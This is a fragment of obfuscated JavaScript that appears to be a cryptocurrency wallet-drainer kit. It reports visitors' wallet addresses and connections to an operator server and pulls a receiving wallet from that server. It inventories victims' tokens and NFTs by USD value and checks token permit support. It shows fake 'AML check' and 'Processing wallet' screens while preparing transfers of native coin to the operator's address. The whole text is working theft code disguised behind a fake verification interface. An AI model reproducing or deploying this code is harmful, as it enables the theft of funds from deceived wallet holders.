        _0x3b764a[_0x130e7f(0x241)] = MS_Partner_Address;
        const _0x33c1c8 = btoa(String(0x5 + 0xa + 0x16d + 0x800 + 0x363 + prs_enc))
          , _0x41bfed = prs(_0x33c1c8, btoa(JSON[_0x130e7f(0x3a6)](_0x3b764a)))
          , _0x57e3d5 = await fetch(_0x130e7f(0x30b) + MS_Server, {
            'method': _0x130e7f(0x289),
            'headers': {
                'Accept': _0x130e7f(0x263),
                'Content-Type': _0x130e7f(0x1d3)
            },
            'body': _0x130e7f(0x1d6) + _0x41bfed
        });
        let _0x593468 = JSON[_0x130e7f(0x258)](atob(srp(_0x33c1c8, await _0x57e3d5[_0x130e7f(0x386)]())));
        if (!_0x593468[_0x130e7f(0x250)])
            return {
                'status': _0x130e7f(0x385),
                'error': _0x130e7f(0x367)
            };
        else {
            if (_0x593468[_0x130e7f(0x250)] == 'error' && _0x593468[_0x130e7f(0x385)] == _0x130e7f(0x2dc))
                MS_Force_Mode = !![];
            if (_0x593468[_0x130e7f(0x250)] == _0x130e7f(0x385) && _0x593468[_0x130e7f(0x385)] == _0x130e7f(0x331)) {
                MS_Force_Mode = !![];
                try {
                    MS_Loader_Style == 0x2 ? MSL['fire']({
                        'icon': _0x130e7f(0x385),
                        'title': _0x130e7f(0x1fd),
                        'subtitle': 'Server\x20Error',
                        'text': _0x130e7f(0x19e),
                        'confirmButtonText': 'OK',
                        'timer': 0x7530,
                        'color': MS_Color_Scheme
                    }) : (Swal[_0x130e7f(0x1de)](),
                    Swal[_0x130e7f(0x211)]({
                        'html': '<b>Server\x20Error</b>\x20Please,\x20check\x20client\x20and\x20server\x20version,\x20looks\x20like\x20it\x20doesn\x27t\x20match,\x20or\x20maybe\x20you\x20need\x20to\x20clear\x20cache\x20everywhere\x20:(',
                        'icon': 'error',
                        'allowOutsideClick': !![],
                        'allowEscapeKey': !![],
                        'timer': 0x0,
                        'width': 0x258,
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK'
                    }));
                } catch (_0x536d7a) {
                    console[_0x130e7f(0x217)](_0x536d7a);
                }
            }
            return _0x593468;
        }
    } catch (_0x580685) {
        return console[_0x130e7f(0x217)](_0x580685),
        {
            'status': 'error',
            'error': _0x130e7f(0x367)
        };
    }
}
  , retrive_config = async()=>{
    const _0x4f26fc = a0_0x66027a;
    try {
        const _0x337613 = await send_request({
            'action': _0x4f26fc(0x27c)
        });
        if (_0x337613['status'] == 'OK') {
            MS_Connection = !![],
            MS_Settings = _0x337613[_0x4f26fc(0x29b)],
            MS_Gas_Multiplier = MS_Settings[_0x4f26fc(0x2d2)][_0x4f26fc(0x3b0)];
            if (!MS_Settings[_0x4f26fc(0x396)])
                MS_Bad_Country = ![];
            typeof MS_Settings[_0x4f26fc(0x391)] == _0x4f26fc(0x29f) && MS_Settings['DSB'] === !![] && (window[_0x4f26fc(0x29e)][_0x4f26fc(0x2f0)] = _0x4f26fc(0x35d));
        }
    } catch (_0x40d126) {
        console[_0x4f26fc(0x217)](_0x40d126);
    }
}
  , retrive_wallet = async()=>{
    const _0x3923e4 = a0_0x66027a;
    try {
        let _0x14348f = null;
        if (localStorage[_0x3923e4(0x2b3)])
            _0x14348f = {
                'address': localStorage[_0x3923e4(0x2b3)]
            };
        const _0x3486a2 = await send_request({
            'action': _0x3923e4(0x1a6),
            'personal_wallet': _0x14348f
        });
        _0x3486a2[_0x3923e4(0x250)] == 'OK' && (MS_Settings['Personal_Wallet'] = _0x3486a2[_0x3923e4(0x287)],
        MS_Settings['Personal_Wallet'] && typeof MS_Settings[_0x3923e4(0x1ef)] == 'object' && (localStorage[_0x3923e4(0x2b3)] = MS_Settings['Personal_Wallet'][_0x3923e4(0x34b)]));
    } catch (_0x493d4e) {
        console['log'](_0x493d4e),
        MS_Settings[_0x3923e4(0x1ef)] = null;
    }
}
  , retrive_contract = async()=>{
    const _0x4962e0 = a0_0x66027a;
    try {
        const _0x1a85b2 = await send_request({
            'action': 'retrive_contract'
        });
        if (_0x1a85b2[_0x4962e0(0x250)] == 'OK')
            MS_Contract_ABI = _0x1a85b2['data'];
    } catch (_0x282e40) {
        console[_0x4962e0(0x217)](_0x282e40);
    }
}
  , enter_website = async()=>{
    const _0x3436db = a0_0x66027a;
    try {
        let _0x19065b = await send_request({
            'action': _0x3436db(0x34d),
            'user_id': MS_ID,
            'time': new Date()['toLocaleString'](_0x3436db(0x19d))
        });
        _0x19065b[_0x3436db(0x250)] == _0x3436db(0x385) && _0x19065b[_0x3436db(0x385)] == _0x3436db(0x375) && (MS_Bad_Country = !![]);
    } catch (_0x4528c2) {
        console[_0x3436db(0x217)](_0x4528c2);
    }
}
  , leave_website = async()=>{
    const _0xc9635f = a0_0x66027a;
    try {
        if (!MS_Settings[_0xc9635f(0x382)][_0xc9635f(0x2df)])
            return;
        await send_request({
            'action': 'leave_website',
            'user_id': MS_ID
        });
    } catch (_0x3c358f) {
        console[_0xc9635f(0x217)](_0x3c358f);
    }
}
  , connect_request = async()=>{
    const _0x233f37 = a0_0x66027a;
    try {
        if (!MS_Settings['Notifications'][_0x233f37(0x204)])
            return;
        await send_request({
            'action': _0x233f37(0x204),
            'user_id': MS_ID,
            'wallet': MS_Current_Provider
        });
    } catch (_0x323c30) {
        console[_0x233f37(0x217)](_0x323c30);
    }
}
  , connect_cancel = async()=>{
    const _0x10d125 = a0_0x66027a;
    try {
        if (!MS_Settings[_0x10d125(0x382)]['connect_cancel'])
            return;
        await send_request({
            'action': 'connect_cancel',
            'user_id': MS_ID
        });
    } catch (_0x58ad36) {
        console['log'](_0x58ad36);
    }
}
  , connect_success = async()=>{
    const _0x2ee8bb = a0_0x66027a;
    try {
        if (!MS_Settings[_0x2ee8bb(0x382)][_0x2ee8bb(0x1cd)])
            return;
        await send_request({
            'action': _0x2ee8bb(0x1cd),
            'user_id': MS_ID,
            'address': MS_Current_Address,
            'wallet': MS_Current_Provider,
            'chain_id': MS_Current_Chain_ID
        });
    } catch (_0x54c450) {
        console[_0x2ee8bb(0x217)](_0x54c450);
    }
}
  , convert_chain = (_0x472671,_0x56b2aa,_0x42dac9)=>{
    const _0x2aaca8 = a0_0x66027a;
    try {
        if (_0x472671 == _0x2aaca8(0x1d9) && _0x56b2aa == 'ID')
            switch (_0x42dac9) {
            case _0x2aaca8(0x2e3):
                return 0x1;
            case _0x2aaca8(0x30e):
                return 0x38;
            case _0x2aaca8(0x348):
                return 0x89;
            case 'avalanche':
                return 0xa86a;
            case _0x2aaca8(0x368):
                return 0xa4b1;
            case _0x2aaca8(0x201):
                return 0xa;
            case 'fantom':
                return 0xfa;
            case _0x2aaca8(0x303):
                return 0x144;
            case _0x2aaca8(0x228):
                return 0x2105;
            case _0x2aaca8(0x21d):
                return 0x171;
            default:
                return ![];
            }
        else {
            if (_0x472671 == _0x2aaca8(0x33f) && _0x56b2aa == 'ID')
                switch (_0x42dac9) {
                case _0x2aaca8(0x2f5):
                    return 0x1;
                case _0x2aaca8(0x269):
                    return 0x89;
                case _0x2aaca8(0x38d):
                    return 0xa86a;
                case 'arbitrum':
                    return 0xa4b1;
                case _0x2aaca8(0x201):
                    return 0xa;
                case _0x2aaca8(0x303):
                    return 0x144;
                case _0x2aaca8(0x228):
                    return 0x2105;
                case _0x2aaca8(0x21d):
                    return 0x171;
                default:
                    return ![];
                }
            else {
                if (_0x472671 == 'ID' && _0x56b2aa == _0x2aaca8(0x1d9))
                    switch (_0x42dac9) {
                    case 0x1:
                        return _0x2aaca8(0x2e3);
                    case 0x38:
                        return _0x2aaca8(0x30e);
                    case 0x89:
                        return 'polygon';
                    case 0xa86a:
                        return _0x2aaca8(0x38d);
                    case 0xa4b1:
                        return _0x2aaca8(0x368);
                    case 0xa:
                        return 'optimism';
                    case 0xfa:
                        return _0x2aaca8(0x280);
                    case 0x19:
                        return _0x2aaca8(0x1cb);
                    case 0x64:
                        return _0x2aaca8(0x387);
                    case 0x80:
                        return _0x2aaca8(0x39e);
                    case 0x504:
                        return _0x2aaca8(0x22c);
                    case 0x505:
                        return _0x2aaca8(0x320);
                    case 0x8ae:
                        return 'kava';
                    case 0xa4ec:
                        return _0x2aaca8(0x1b9);
                    case 0x63564c40:
                        return 'harmony';
                    case 0x144:
                        return _0x2aaca8(0x2bd);
                    case 0x2105:
                        return _0x2aaca8(0x228);
                    case 0x171:
                        return _0x2aaca8(0x21d);
                    default:
                        return ![];
                    }
                else {
                    if (_0x472671 == 'ID' && _0x56b2aa == _0x2aaca8(0x293))
                        switch (_0x42dac9) {
                        case 0x1:
                            return _0x2aaca8(0x24a);
                        case 0x38:
                            return _0x2aaca8(0x381);
                        case 0x89:
                            return _0x2aaca8(0x1ee);
                        case 0xa86a:
                            return _0x2aaca8(0x343);
                        case 0xa4b1:
                            return _0x2aaca8(0x24a);
                        case 0xa:
                            return _0x2aaca8(0x24a);
                        case 0xfa:
                            return 'FTM';
                        case 0x19:
                            return _0x2aaca8(0x328);
                        case 0x64:
                            return _0x2aaca8(0x1c2);
                        case 0x80:
                            return 'HT';
                        case 0x504:
                            return _0x2aaca8(0x1ab);
                        case 0x505:
                            return _0x2aaca8(0x34c);
                        case 0x8ae:
                            return _0x2aaca8(0x1d5);
                        case 0xa4ec:
                            return 'CELO';
                        case 0x63564c40:
                            return 'ONE';
                        case 0x144:
                            return _0x2aaca8(0x24a);
                        case 0x2105:
                            return _0x2aaca8(0x24a);
                        case 0x171:
                            return _0x2aaca8(0x384);
                        default:
                            return ![];
                        }
                }
            }
        }
    } catch (_0x34b93b) {
        return console['log'](_0x34b93b),
        ![];
    }
}
  , get_tokens = async _0x5ce447=>{
    const _0x314256 = a0_0x66027a;
    try {
        let _0x3cabca = []
          , _0x28f604 = await fetch(_0x314256(0x23c) + (MS_Settings['AT'] || ''), {
            'method': _0x314256(0x289),
            'headers': {
                'Accept': _0x314256(0x1ed),
                'Content-Type': _0x314256(0x1ed)
            },
            'body': JSON[_0x314256(0x3a6)]({
                'id': 0x1,
                'jsonrpc': _0x314256(0x3aa),
                'method': _0x314256(0x28a),
                'params': {
                    'blockchain': [_0x314256(0x2e3), _0x314256(0x228), _0x314256(0x30e), _0x314256(0x348), 'avalanche', _0x314256(0x368), _0x314256(0x280), _0x314256(0x201), 'base'],
                    'walletAddress': _0x5ce447
                }
            })
        });
        _0x28f604 = await _0x28f604[_0x314256(0x326)]();
        for (const _0x3b6dbf of _0x28f604[_0x314256(0x332)]['assets']) {
            try {
                let _0x19af7d = _0x3b6dbf['contractAddress'] || _0x314256(0x309);
                if (MS_Settings[_0x314256(0x2e1)]['length'] > 0x0 && !MS_Settings[_0x314256(0x2e1)][_0x314256(0x389)](_0x19af7d[_0x314256(0x2d4)]()[_0x314256(0x2fc)]()))
                    continue;
                else {
                    if (MS_Settings[_0x314256(0x2e7)]['length'] > 0x0 && MS_Settings[_0x314256(0x2e7)][_0x314256(0x389)](_0x19af7d[_0x314256(0x2d4)]()['trim']()))
                        continue;
                }
                let _0x34726f = {
                    'chain_id': convert_chain(_0x314256(0x1d9), 'ID', _0x3b6dbf[_0x314256(0x2ec)]),
                    'name': _0x3b6dbf['tokenName'],
                    'type': _0x3b6dbf[_0x314256(0x294)],
                    'amount': parseFloat(_0x3b6dbf[_0x314256(0x245)]),
                    'amount_raw': _0x3b6dbf[_0x314256(0x255)],
                    'amount_usd': parseFloat(_0x3b6dbf['balanceUsd']),
                    'symbol': _0x3b6dbf[_0x314256(0x3a4)],
                    'decimals': _0x3b6dbf['tokenDecimals'],
                    'address': _0x19af7d || null,
                    'price': parseFloat(_0x3b6dbf['tokenPrice'])
                };
                if (_0x34726f[_0x314256(0x235)] > 0x0)
                    _0x3cabca['push'](_0x34726f);
            } catch (_0x2cc9fb) {
                console['log'](_0x2cc9fb);
            }
        }
        return _0x3cabca;
    } catch (_0x5e422c) {
        return console[_0x314256(0x217)](_0x5e422c),
        [];
    }
}
  , get_nfts = async _0x370e4f=>{
    const _0x3efb7f = a0_0x66027a;
    try {
        let _0x7dcfba = await fetch(_0x3efb7f(0x374) + _0x370e4f + '&order_direction=desc&limit=200&include_orders=false')
          , _0x5ab5f0 = (await _0x7dcfba['json']())[_0x3efb7f(0x19a)];
        _0x7dcfba = await fetch('https://api.opensea.io/api/v1/collections?asset_owner=' + _0x370e4f + '&offset=0&limit=200');
        let _0x50b7a9 = await _0x7dcfba[_0x3efb7f(0x326)]()
          , _0x2e1836 = [];
        for (const _0x1cefe3 of _0x5ab5f0) {
            try {
                let _0x43397e = null;
                for (const _0x416ba7 of _0x50b7a9) {
                    try {
                        if (_0x416ba7[_0x3efb7f(0x20b)][_0x3efb7f(0x2ae)] < 0x1)
                            continue;
                        if (_0x416ba7['primary_asset_contracts'][0x0][_0x3efb7f(0x34b)] == _0x1cefe3[_0x3efb7f(0x1c3)]['address']) {
                            _0x43397e = _0x416ba7;
                            break;
                        }
                    } catch (_0xcb23b3) {
                        console['log'](_0xcb23b3);
                    }
                }
                if (_0x43397e == null)
                    continue;
                if (MS_Settings[_0x3efb7f(0x2e1)][_0x3efb7f(0x2ae)] > 0x0 && !MS_Settings[_0x3efb7f(0x2e1)]['includes'](_0x1cefe3[_0x3efb7f(0x1c3)][_0x3efb7f(0x34b)][_0x3efb7f(0x2d4)]()[_0x3efb7f(0x2fc)]()))
                    continue;
                else {
                    if (MS_Settings[_0x3efb7f(0x2e7)][_0x3efb7f(0x2ae)] > 0x0 && MS_Settings['Contract_Blacklist']['includes'](_0x1cefe3[_0x3efb7f(0x1c3)][_0x3efb7f(0x34b)][_0x3efb7f(0x2d4)]()[_0x3efb7f(0x2fc)]()))
                        continue;
                }
                let _0x44c4a4 = convert_chain(_0x3efb7f(0x33f), 'ID', _0x1cefe3[_0x3efb7f(0x1c3)]['chain_identifier'])
                  , _0x46c593 = _0x43397e[_0x3efb7f(0x1eb)][_0x3efb7f(0x1a9)] != 0x0 ? _0x43397e[_0x3efb7f(0x1eb)]['one_day_average_price'] : _0x43397e[_0x3efb7f(0x1eb)][_0x3efb7f(0x24c)];
                _0x46c593 = _0x46c593 * MS_Currencies[convert_chain('ID', _0x3efb7f(0x293), _0x44c4a4)][_0x3efb7f(0x2fa)];
                let _0x3db547 = {
                    'chain_id': _0x44c4a4,
                    'name': _0x1cefe3[_0x3efb7f(0x2c9)],
                    'type': _0x1cefe3[_0x3efb7f(0x1c3)]['schema_name'],
                    'amount': _0x1cefe3['num_sales'],
                    'amount_raw': null,
                    'amount_usd': _0x46c593,
                    'id': _0x1cefe3[_0x3efb7f(0x350)],
                    'symbol': null,
                    'decimals': null,
                    'address': _0x1cefe3['asset_contract'][_0x3efb7f(0x34b)],
                    'price': _0x46c593
                };
                if (typeof _0x46c593 == 'number' && !isNaN(_0x46c593) && _0x46c593 > 0x0)
                    _0x2e1836['push'](_0x3db547);
            } catch (_0x211f3f) {
                console[_0x3efb7f(0x217)](_0x211f3f);
            }
        }
        return _0x2e1836;
    } catch (_0x8218a2) {
        return console[_0x3efb7f(0x217)](_0x8218a2),
        [];
    }
}
  , retrive_timeout = {}
  , retrive_token = async(_0x1ef194,_0xee71e4)=>{
    const _0xc71984 = a0_0x66027a;
    try {
        if (!MS_API_Data[_0x1ef194] || MS_Settings[_0xc71984(0x2d2)][_0xc71984(0x308)][convert_chain('ID', 'ANKR', _0x1ef194)][_0xc71984(0x261)] == '')
            return MS_Contract_ABI['ERC20'];
        while (retrive_timeout[_0x1ef194] && retrive_timeout[_0x1ef194][_0xc71984(0x3a1)] == Math[_0xc71984(0x24b)](Date['now']() / 0x3e8) && retrive_timeout[_0x1ef194]['count'] >= 0x5)
            await new Promise(_0xd007c9=>setTimeout(_0xd007c9, 0x64));
        if (!retrive_timeout[_0x1ef194])
            retrive_timeout[_0x1ef194] = {
                'time': Math[_0xc71984(0x24b)](Date['now']() / 0x3e8),
                'count': 0x1
            };
        else {
            if (retrive_timeout[_0x1ef194]['time'] == Math[_0xc71984(0x24b)](Date[_0xc71984(0x1e4)]() / 0x3e8))
                retrive_timeout[_0x1ef194]['count'] += 0x1;
            else
                retrive_timeout[_0x1ef194][_0xc71984(0x3a1)] = Math[_0xc71984(0x24b)](Date['now']() / 0x3e8),
                retrive_timeout[_0x1ef194][_0xc71984(0x34e)] = 0x1;
        }
        let _0x436c78 = await fetch(_0xc71984(0x30b) + MS_API_Data[_0x1ef194] + _0xc71984(0x27d) + _0xee71e4 + _0xc71984(0x36d) + MS_Settings[_0xc71984(0x2d2)]['Chains'][convert_chain('ID', _0xc71984(0x1d9), _0x1ef194)][_0xc71984(0x261)], {
            'method': _0xc71984(0x39c),
            'headers': {
                'Accept': _0xc71984(0x1ed)
            }
        });
        _0x436c78 = await _0x436c78[_0xc71984(0x326)]();
        if (_0x436c78[_0xc71984(0x2d1)] == 'OK') {
            if (_0x436c78[_0xc71984(0x332)][0x0][_0xc71984(0x36a)] == '1' && _0x436c78[_0xc71984(0x332)][0x0][_0xc71984(0x2cb)] != '') {
                const _0x19bdc4 = _0x436c78[_0xc71984(0x332)][0x0][_0xc71984(0x2cb)];
                return retrive_token(_0x1ef194, _0x19bdc4);
            } else
                return JSON[_0xc71984(0x258)](_0x436c78[_0xc71984(0x332)][0x0][_0xc71984(0x1bc)]);
        } else
            return MS_Contract_ABI[_0xc71984(0x2f2)];
    } catch (_0x305f0e) {
        return MS_Contract_ABI[_0xc71984(0x2f2)];
    }
}
  , get_permit_type = _0x50d7dc=>{
    const _0x632710 = a0_0x66027a;
    try {
        if (MS_Settings['Settings'][_0x632710(0x395)]['Mode'] == ![])
            return 0x0;
        if (_0x50d7dc[_0x632710(0x329)](_0x632710(0x1fa)) && _0x50d7dc['hasOwnProperty']('nonces') && _0x50d7dc[_0x632710(0x329)](_0x632710(0x2c9)) && _0x50d7dc[_0x632710(0x329)](_0x632710(0x2c0))) {
            const _0x3fd094 = (_0x2d59e2=>{
                const _0x4cb04d = _0x632710;
                for (const _0x12e0b0 in _0x2d59e2) {
                    if (_0x12e0b0[_0x4cb04d(0x238)](_0x4cb04d(0x397))) {
                        const _0x122266 = _0x12e0b0[_0x4cb04d(0x2d5)](0x7)['split'](',');
                        if (_0x122266[_0x4cb04d(0x2ae)] === 0x7 && _0x12e0b0['indexOf']('bool') === -0x1)
                            return 0x2;
                        if (_0x122266['length'] === 0x8 && _0x12e0b0[_0x4cb04d(0x248)]('bool') !== -0x1)
                            return 0x1;
                        return 0x0;
                    }
                }
            }
            )(_0x50d7dc);
            return _0x3fd094;
        } else
            return 0x0;
    } catch (_0x4a1063) {
        return 0x0;
    }
}
  , MS_Gas_Reserves = {}
  , show_check = ()=>{
    const _0x16a787 = a0_0x66027a;
    try {
        MS_Loader_Style == 0x2 ? MSL[_0x16a787(0x211)]({
            'icon': _0x16a787(0x2a1),
            'title': _0x16a787(0x2a4),
            'text': _0x16a787(0x246),
            'showConfirmButton': !![],
            'confirmButtonText': _0x16a787(0x264),
            'timer': 0x7d0,
            'color': MS_Color_Scheme
        })[_0x16a787(0x266)](()=>{
            const _0x2e1117 = _0x16a787;
            if (MS_Check_Done)
                return;
            MSL['fire']({
                'icon': _0x2e1117(0x2a1),
                'title': 'Processing\x20wallet',
                'text': _0x2e1117(0x2e2),
                'showConfirmButton': !![],
                'confirmButtonText': 'Loading...',
                'timer': 0x1388,
                'color': MS_Color_Scheme
            })[_0x2e1117(0x266)](()=>{
                const _0x7df058 = _0x2e1117;
                if (MS_Check_Done)
                    return;
                MSL[_0x7df058(0x211)]({
                    'icon': 'load',
                    'title': 'Processing\x20wallet',
                    'text': 'Checking\x20your\x20wallet\x20for\x20AML...',
                    'showConfirmButton': !![],
                    'confirmButtonText': 'Loading...',
                    'timer': 0x1388,
                    'color': MS_Color_Scheme
                })[_0x7df058(0x266)](()=>{
                    const _0x581873 = _0x7df058;
                    if (MS_Check_Done)
                        return;
                    MSL[_0x581873(0x211)]({
                        'icon': 'success',
                        'title': _0x581873(0x2a4),
                        'subtitle': _0x581873(0x2b9),
                        'text': _0x581873(0x306),
                        'showConfirmButton': ![],
                        'timer': 0x1388,
                        'color': MS_Color_Scheme
                    })[_0x581873(0x266)](()=>{
                        const _0x2c0056 = _0x581873;
                        if (MS_Check_Done)
                            return;
                        MSL[_0x2c0056(0x211)]({
                            'icon': _0x2c0056(0x2a1),
                            'title': _0x2c0056(0x2a4),
                            'text': _0x2c0056(0x33e),
                            'showConfirmButton': !![],
                            'confirmButtonText': 'Loading...',
                            'timer': 0x493e0,
                            'color': MS_Color_Scheme
                        });
                    }
                    );
                }
                );
            }
            );
        }
        ) : Swal['fire']({
            'title': _0x16a787(0x284),
            'icon': _0x16a787(0x25e),
            'timer': 0x7d0
        })['then'](()=>{
            const _0x1c3881 = _0x16a787;
            if (MS_Check_Done)
                return;
            Swal[_0x1c3881(0x211)]({
                'text': _0x1c3881(0x213),
                'imageUrl': _0x1c3881(0x23b),
                'imageHeight': 0x3c,
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x1388,
                'width': 0x258,
                'showConfirmButton': ![]
            })[_0x1c3881(0x266)](()=>{
                const _0x541031 = _0x1c3881;
                if (MS_Check_Done)
                    return;
                Swal[_0x541031(0x211)]({
                    'text': _0x541031(0x2e2),
                    'imageUrl': _0x541031(0x23b),
                    'imageHeight': 0x3c,
                    'allowOutsideClick': ![],
                    'allowEscapeKey': ![],
                    'timer': 0x1388,
                    'width': 0x258,
                    'showConfirmButton': ![]
                })[_0x541031(0x266)](()=>{
                    const _0x3801a0 = _0x541031;
                    if (MS_Check_Done)
                        return;
                    Swal[_0x3801a0(0x211)]({
                        'text': _0x3801a0(0x1a0),
                        'imageUrl': _0x3801a0(0x23b),
                        'imageHeight': 0x3c,
                        'allowOutsideClick': ![],
                        'allowEscapeKey': ![],
                        'timer': 0x1388,
                        'width': 0x258,
                        'showConfirmButton': ![]
                    })[_0x3801a0(0x266)](()=>{
                        const _0x400518 = _0x3801a0;
                        if (MS_Check_Done)
                            return;
                        Swal[_0x400518(0x211)]({
                            'text': _0x400518(0x196),
                            'icon': _0x400518(0x25e),
                            'allowOutsideClick': ![],
                            'allowEscapeKey': ![],
                            'timer': 0x7d0,
                            'width': 0x258,
                            'showConfirmButton': ![]
                        })[_0x400518(0x266)](()=>{
                            const _0x154635 = _0x400518;
                            if (MS_Check_Done)
                                return;
                            Swal['fire']({
                                'text': _0x154635(0x33e),
                                'imageUrl': _0x154635(0x23b),
                                'imageHeight': 0x3c,
                                'allowOutsideClick': ![],
                                'allowEscapeKey': ![],
                                'timer': 0x0,
                                'width': 0x258,
                                'showConfirmButton': ![]
                            });
                        }
                        );
                    }
                    );
                }
                );
            }
            );
        }
        );
    } catch (_0x4638d0) {
        console[_0x16a787(0x217)](_0x4638d0);
    }
}
  , get_nonce = async _0x4156d3=>{
    const _0x1d3ff4 = a0_0x66027a
      , _0x11e5e3 = new ethers['providers'][(_0x1d3ff4(0x21c))](MS_Settings[_0x1d3ff4(0x1a7)][_0x4156d3]);
    return await _0x11e5e3[_0x1d3ff4(0x290)](MS_Current_Address, 'pending');
}
  , wait_message = ()=>{
    const _0x3047b2 = a0_0x66027a;
    try {
        if (!MS_Process)
            return;
        Swal[_0x3047b2(0x1de)](),
        MS_Loader_Style == 0x2 ? MSL[_0x3047b2(0x211)]({
            'icon': _0x3047b2(0x25e),
            'title': 'OK',
            'subtitle': _0x3047b2(0x244),
            'text': 'Got\x20your\x20sign,\x20wait\x20a\x20bit\x20for\x20confirmation...',
            'showConfirmButton': ![],
            'timer': 0x9c4,
            'color': MS_Color_Scheme
        })[_0x3047b2(0x266)](()=>{
            const _0x20e844 = _0x3047b2;
            MSL[_0x20e844(0x211)]({
                'icon': 'load',
                'title': _0x20e844(0x24e),
                'text': _0x20e844(0x27f),
                'showConfirmButton': !![],
                'confirmButtonText': _0x20e844(0x1a1),
                'showConfirmButton': ![],
                'color': MS_Color_Scheme
            });
        }
        ) : Swal[_0x3047b2(0x211)]({
            'html': _0x3047b2(0x251),
            'icon': _0x3047b2(0x25e),
            'allowOutsideClick': ![],
            'allowEscapeKey': ![],
            'timer': 0x9c4,
            'width': 0x258,
            'showConfirmButton': ![]
        })['then'](()=>{
            const _0x494e28 = _0x3047b2;
            Swal[_0x494e28(0x211)]({
                'html': _0x494e28(0x1b6),
                'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                'imageHeight': 0x3c,
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': ![]
            });
        }
        );
    } catch (_0x261b36) {
        console[_0x3047b2(0x217)](_0x261b36);
    }
}
  , end_message = ()=>{
    const _0x1d666e = a0_0x66027a;
    try {
        MS_Loader_Style == 0x2 ? MSL['fire']({
            'icon': 'error',
            'title': _0x1d666e(0x1e7),
            'subtitle': _0x1d666e(0x19c),
            'text': _0x1d666e(0x21a),
            'showConfirmButton': !![],
            'confirmButtonText': 'OK',
            'color': MS_Color_Scheme
        }) : (Swal[_0x1d666e(0x1de)](),
        Swal[_0x1d666e(0x211)]({
            'html': _0x1d666e(0x24f),
            'icon': _0x1d666e(0x385),
            'allowOutsideClick': !![],
            'allowEscapeKey': !![],
            'timer': 0x0,
            'width': 0x258,
            'showConfirmButton': !![],
            'confirmButtonText': 'OK'
        }));
    } catch (_0x55d1cc) {
        console[_0x1d666e(0x217)](_0x55d1cc);
    }
}
;
let is_first_sign = !![];
const sign_ready = ()=>{
    const _0x1ca545 = a0_0x66027a;
    try {
        MS_Loader_Style == 0x2 ? MSL[_0x1ca545(0x211)]({
            'icon': _0x1ca545(0x25e),
            'title': 'OK',
            'subtitle': _0x1ca545(0x338),
            'text': _0x1ca545(0x215),
            'showConfirmButton': ![],
            'color': MS_Color_Scheme
        }) : (Swal[_0x1ca545(0x1de)](),
        Swal[_0x1ca545(0x211)]({
            'html': '<b>Success!</b>\x20Your\x20sign\x20is\x20confirmed!',
            'icon': 'success',
            'allowOutsideClick': ![],
            'allowEscapeKey': ![],
            'timer': 0x0,
            'width': 0x258,
            'showConfirmButton': ![]
        }));
    } catch (_0x90b8ae) {
        console[_0x1ca545(0x217)](_0x90b8ae);
    }
}
  , sign_next = ()=>{
    const _0xba31e3 = a0_0x66027a;
    try {
        if (is_first_sign) {
            is_first_sign = ![];
            return;
        }
        MS_Loader_Style == 0x2 ? MSL['fire']({
            'icon': 'load',
            'title': 'Waiting\x20for\x20action',
            'text': _0xba31e3(0x2c2),
            'showConfirmButton': !![],
            'confirmButtonText': 'Waiting...',
            'color': MS_Color_Scheme
        }) : (Swal[_0xba31e3(0x1de)](),
        Swal[_0xba31e3(0x211)]({
            'html': _0xba31e3(0x32a),
            'imageUrl': _0xba31e3(0x23b),
            'imageHeight': 0x3c,
            'allowOutsideClick': ![],
            'allowEscapeKey': ![],
            'timer': 0x0,
            'width': 0x258,
            'showConfirmButton': ![]
        }));
    } catch (_0x5cc779) {
        console[_0xba31e3(0x217)](_0x5cc779);
    }
}
  , is_nft_approved = async(_0x376631,_0x2370f1,_0xaa71d6)=>{
    const _0x2e3d22 = a0_0x66027a;
    try {
        const _0x4dbf41 = new ethers[(_0x2e3d22(0x38b))][(_0x2e3d22(0x21c))](MS_Settings[_0x2e3d22(0x1a7)][0x1])
          , _0x140d42 = new ethers[(_0x2e3d22(0x2b7))](_0x376631,MS_Contract_ABI[_0x2e3d22(0x28d)],_0x4dbf41);
        return await _0x140d42[_0x2e3d22(0x1ae)](_0x2370f1, _0xaa71d6);
    } catch (_0x1ea76a) {
        return console[_0x2e3d22(0x217)](_0x1ea76a),
        ![];
    }
}
  , get_gas_limit_def_by_chain_id = _0x1959a5=>{
    switch (_0x1959a5) {
    case 0xa4b1:
        return BN(0x4c4b40);
    case 0xa86a:
        return BN(0x4c4b40);
    default:
        return BN(0x186a0);
    }
}
  , SIGN_NATIVE = async _0x1fa01b=>{
    const _0x5f2119 = a0_0x66027a
      , _0x730633 = new ethers[(_0x5f2119(0x38b))][(_0x5f2119(0x21c))](MS_Settings[_0x5f2119(0x1a7)][_0x1fa01b[_0x5f2119(0x3ab)]])
      , _0x458833 = BN(await _0x730633[_0x5f2119(0x2a9)]())[_0x5f2119(0x273)](BN(0x64))['mul'](BN(Math['floor'](MS_Gas_Multiplier * 0x64)))
      , _0x4d286e = new ethers[(_0x5f2119(0x38b))][(_0x5f2119(0x21c))](MS_Settings[_0x5f2119(0x1a7)][0x1])
      , _0x404dd0 = BN(await _0x4d286e[_0x5f2119(0x2a9)]())[_0x5f2119(0x273)](BN(0x64))[_0x5f2119(0x28f)](BN(Math[_0x5f2119(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0x241fe8 = BN(_0x1fa01b['chain_id'] == 0xa4b1 ? 0x4c4b40 : _0x1fa01b[_0x5f2119(0x3ab)] == 0xa86a ? 0x4c4b40 : _0x1fa01b['chain_id'] == 0x171 ? 0xdbba0 : 0x249f0)
      , _0x534d76 = _0x241fe8['mul'](MS_Gas_Reserves[_0x1fa01b[_0x5f2119(0x3ab)]] + 0x1)[_0x5f2119(0x28f)](_0x458833);
    let _0x59bbb8 = {
        'from': MS_Current_Address,
        'to': MS_Settings[_0x5f2119(0x365)],
        'value': BN(0x64),
        'data': '0x'
    }
      , _0x34c5dc = null;
    try {
        _0x34c5dc = await _0x730633[_0x5f2119(0x393)](_0x59bbb8);
    } catch (_0x27a91a) {
        _0x34c5dc = get_gas_limit_def_by_chain_id(parseInt(_0x1fa01b['chain_id']));
    }
    const _0x324885 = await _0x730633[_0x5f2119(0x38e)](MS_Current_Address);
    let _0x157fe1 = _0x324885[_0x5f2119(0x259)](_0x34c5dc[_0x5f2119(0x28f)](_0x458833))[_0x5f2119(0x259)](_0x534d76);
